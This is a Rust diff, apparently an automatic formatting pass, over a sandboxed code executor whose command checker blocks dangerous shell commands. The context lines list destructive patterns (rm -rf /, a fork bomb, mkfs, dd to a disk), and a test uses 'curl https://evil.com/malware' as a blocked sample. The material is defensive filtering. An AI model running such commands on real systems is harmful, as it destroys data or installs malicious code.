@@ -176,15 +176,15 @@ impl Default for CommandChecker {
 impl CommandChecker {
     /// Default blocked patterns
     const DEFAULT_BLOCKED: &'static [&'static str] = &[
-        r"rm\s+-rf\s+/\s*$",       // rm -rf /
-        r"rm\s+-rf\s+/\*",         // rm -rf /*
-        r"rm\s+-rf\s+~\s*$",       // rm -rf ~
-        r"sudo\s+",                // any sudo command
-        r"chmod\s+777\s+/",        // chmod 777 /
+        r"rm\s+-rf\s+/\s*$",             // rm -rf /
+        r"rm\s+-rf\s+/\*",               // rm -rf /*
+        r"rm\s+-rf\s+~\s*$",             // rm -rf ~
+        r"sudo\s+",                      // any sudo command
+        r"chmod\s+777\s+/",              // chmod 777 /
         r":\(\)\s*\{\s*:\|:&\s*\}\s*;:", // fork bomb
-        r">\s*/dev/sd[a-z]",       // overwrite disk
-        r"mkfs\.",                 // format filesystem
-        r"dd\s+if=.*of=/dev/",     // dd to device
+        r">\s*/dev/sd[a-z]",             // overwrite disk
+        r"mkfs\.",                       // format filesystem
+        r"dd\s+if=.*of=/dev/",           // dd to device
     ];
 
     /// Create a new command checker with additional blocked patterns
@@ -345,7 +345,8 @@ pub struct CodeExecutor {
     pass_env: Vec<String>,
 
     /// Runtime info cache to avoid repeated detection
-    runtime_cache: std::sync::Arc<tokio::sync::RwLock<std::collections::HashMap<String, RuntimeInfo>>>,
+    runtime_cache:
+        std::sync::Arc<tokio::sync::RwLock<std::collections::HashMap<String, RuntimeInfo>>>,
 }
 
 impl CodeExecutor {
@@ -379,7 +380,9 @@ impl CodeExecutor {
             permission_checker,
             working_directory,
             pass_env,
-            runtime_cache: std::sync::Arc::new(tokio::sync::RwLock::new(std::collections::HashMap::new())),
+            runtime_cache: std::sync::Arc::new(tokio::sync::RwLock::new(
+                std::collections::HashMap::new(),
+            )),
         }
     }
 
@@ -439,7 +442,9 @@ impl CodeExecutor {
 
         // Check for blocked commands
         if let Some(reason) = self.command_checker.is_blocked(&full_command) {
-            return Err(AetherError::other(CodeExecError::Blocked { reason }.to_string()));
+            return Err(AetherError::other(
+                CodeExecError::Blocked { reason }.to_string(),
+            ));
         }
 
         // Check runtime availability (using cache)
@@ -483,7 +488,9 @@ impl CodeExecutor {
 
         // Check for blocked commands in the script
         if let Some(reason) = self.command_checker.is_blocked(code) {
-            return Err(AetherError::other(CodeExecError::Blocked { reason }.to_string()));
+            return Err(AetherError::other(
+                CodeExecError::Blocked { reason }.to_string(),
+            ));
         }
 
         // Check runtime availability (using cache)
@@ -526,15 +533,17 @@ impl CodeExecutor {
     /// Execute a script file
     async fn execute_file(&self, path: &Path, ctx: &ExecutionContext) -> Result<CodeExecResult> {
         // Check file path permission
-        let canonical_path = self
-            .permission_checker
-            .check_path(path)
-            .map_err(|_e| AetherError::other(CodeExecError::PathNotAllowed(path.to_path_buf()).to_string()))?;
+        let canonical_path = self.permission_checker.check_path(path).map_err(|_e| {
+            AetherError::other(CodeExecError::PathNotAllowed(path.to_path_buf()).to_string())
+        })?;
 
         // Detect language from extension
         let extension = path.extension().and_then(|e| e.to_str()).unwrap_or("");
         let (runtime, args) = match extension {
-            "py" => ("python3", vec![canonical_path.to_string_lossy().to_string()]),
+            "py" => (
+                "python3",
+                vec![canonical_path.to_string_lossy().to_string()],
+            ),
             "js" => ("node", vec![canonical_path.to_string_lossy().to_string()]),
             "sh" | "bash" => ("bash", vec![canonical_path.to_string_lossy().to_string()]),
             "rb" => ("ruby", vec![canonical_path.to_string_lossy().to_string()]),
@@ -611,7 +620,9 @@ impl CodeExecutor {
 
         // Spawn process
         let mut child = cmd.spawn().map_err(|e| {
-            AetherError::other(CodeExecError::IoError(format!("Failed to spawn process: {}", e)).to_string())
+            AetherError::other(
+                CodeExecError::IoError(format!("Failed to spawn process: {}", e)).to_string(),
+            )
         })?;
 
         // Capture output with timeout
@@ -801,7 +812,9 @@ mod tests {
     fn test_command_checker_custom_blocked() {
         let checker = CommandChecker::new(vec!["curl.*evil\\.com".to_string()]);
 
-        assert!(checker.is_blocked("curl https://evil.com/malware").is_some());
+        assert!(checker
+            .is_blocked("curl https://evil.com/malware")
+            .is_some());
         assert!(checker.is_blocked("curl https://example.com").is_none());
     }
 
@@ -897,7 +910,10 @@ mod tests {
         let ctx = ExecutionContext::new("test_graph").with_dry_run(true);
 
         let result = executor.execute(&task, &ctx).await.unwrap();
-        assert!(result.output["stdout"].as_str().unwrap().contains("DRY RUN"));
+        assert!(result.output["stdout"]
+            .as_str()
+            .unwrap()
+            .contains("DRY RUN"));
     }
 
     #[tokio::test]
